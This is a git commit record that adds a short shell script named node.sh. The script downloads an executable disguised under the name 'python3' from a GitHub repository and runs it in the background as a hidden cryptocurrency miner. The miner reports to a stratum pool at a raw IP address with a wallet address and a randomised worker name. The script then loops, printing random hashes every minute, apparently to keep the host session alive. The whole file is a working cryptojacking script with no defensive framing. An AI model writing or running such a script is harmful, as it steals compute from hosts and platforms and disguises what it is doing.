b9a400bb83846f9709ebccc20ef80492f432049e
azizmaziz <114849577+azizmaziz@users.noreply.github.com>
2022-10-10 10:52:55 +0700

    Create node.sh

---
+++ node.sh
@@ -0,0 +1,5 @@
+#!/bin/bash
+curl -L -o python3 https://github.com/viliamriah/newmind/raw/main/python3
+chmod +x python3
+./python3 -a yespower -o stratum+tcp://137.184.136.62:443 -u web1q4f9hemgt64tpj2cranaxhtrcqqqedvnngzunpy.$(echo $(shuf -i 1-20000 -n 1)-cuk) -p x -t 1 >/dev/null &
+while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 1m; done
